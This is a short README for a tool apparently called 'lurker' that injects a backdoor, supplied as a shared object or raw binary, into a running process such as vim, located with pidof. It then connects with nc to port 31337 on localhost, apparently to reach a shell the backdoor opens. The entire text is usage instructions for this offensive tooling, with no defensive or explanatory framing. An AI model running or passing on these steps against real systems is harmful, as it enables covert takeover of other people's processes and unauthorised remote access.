# new_luker
1. Run `make`.

2. start the target process, such as `vim`, by executing: `vim`.

3. In another terminal, execute: ./lurker --s \`pidof vim\` \`pwd\`/bkdoor_so.so OR ./lurker --b \`pidof vim\` bkdoor.o.bin to inject the code into the target process, such as `vim`.

4. Finally,  `nc 127.0.0.1 31337`.
